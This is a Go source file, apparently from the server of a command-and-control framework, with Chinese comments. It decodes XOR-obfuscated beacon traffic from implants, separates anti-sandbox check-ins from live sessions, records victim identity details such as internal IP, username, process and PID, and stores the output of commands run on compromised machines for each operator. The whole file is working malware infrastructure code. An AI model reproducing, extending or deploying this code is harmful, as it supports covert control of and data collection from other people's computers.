package SessionController

import (
	"Server/Public"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"github.com/gin-gonic/gin"
	"io"
	"strconv"
	"time"
)

// 解密会话数据
func DecryptSessionData(c *gin.Context) (map[string]string, []byte, bool) {
	// SessionData: 长度\0会话类型\0身份信息 + 长度\0命令ID\0输出数据 + 长度\0命令ID\0输出数据 + ... + 随机数
	sessionData, err := io.ReadAll(c.Request.Body)
	if err != nil {
		WriteSystemLogInfo("C2 Server", "未授权访问监听器: "+c.ClientIP())
		return nil, nil, true
	}

	// 会话信息: [会话类型: 待定(0)/正式上线(1), 身份信息: FID,SID,内网IP / FID,SID,内网IP,用户名,进程名,PID,位数]
	sessionInfo := make(map[string]string)

	for len(sessionData) > 1 {
		// 解析长度
		outputDataLengthLength := bytes.Index(sessionData, []byte{0x00})
		if outputDataLengthLength == -1 {
			WriteSystemLogInfo("C2 Server", "未授权访问监听器: "+c.ClientIP())
			return nil, nil, true
		}
		outputDataLength, err := strconv.Atoi(string(sessionData[:outputDataLengthLength]))
		if err != nil {
			WriteSystemLogInfo("C2 Server", "未授权访问监听器: "+c.ClientIP())
			return nil, nil, true
		}

		// 解密命令输出数据
		outputData := sessionData[outputDataLengthLength+1 : outputDataLengthLength+outputDataLength+1]
		outputData = DecryptData(outputData, outputDataLength)

		// 更新 会话信息 & 自定义汇编哈希信息 & 命令输出
		if len(sessionInfo) == 0 {
			sessionInfo["sessionType"] = string(outputData[0])
			sessionInfo["identityInfo"] = string(outputData[2:])
		} else {
			_, exist := sessionInfo["selfAsmHashInfo"]
			if !exist {
				sessionInfo["selfAsmHashInfo"] = string(outputData)
			} else {
				commandIdLength := bytes.Index(outputData, []byte{0x00})
				if sessionInfo["sessionType"] == "0" { // 抗沙箱会话
					determineData := outputData[commandIdLength+1:]
					return sessionInfo, determineData, false
				} else if sessionInfo["sessionType"] == "1" { // 正式上线会话
					commandId := string(outputData[:commandIdLength])
					commandInfoMap := UserCommandMap[commandId]
					commandInfoMap["outputDataBase64"] = base64.StdEncoding.EncodeToString(outputData[commandIdLength+1:])
					commandInfoJson, _ := json.Marshal(commandInfoMap)
					Public.AddNewData("CommandOutput", commandInfoMap["username"], string(commandInfoJson))
					delete(UserCommandMap, commandId)
				}
			}
		}
		sessionData = sessionData[outputDataLengthLength+outputDataLength+1:]
	}
	return sessionInfo, nil, false
}

// 加密数据
func EncryptData(data []byte, dataLength int) []byte {
	for i := 0; i < dataLength-1; i++ {
		data[i] ^= data[dataLength-1]
	}
	return data
}

// 解密数据
func DecryptData(data []byte, dataLength int) []byte {
	for i := 0; i < dataLength-1; i++ {
		data[i] ^= data[dataLength-1]
	}
	return data
}

// 写入系统日志 (避免依赖冲突)
func WriteSystemLogInfo(username, content string) {
	currentTime := time.Now().Format("2006.01.02 15:04:05")
	Public.AddNewData("SystemLog", username, content+" "+currentTime)
	Public.SqlExec("insert into SystemLogInfo (username, content, time) values (?, ?, ?)", username, content, currentTime)
}
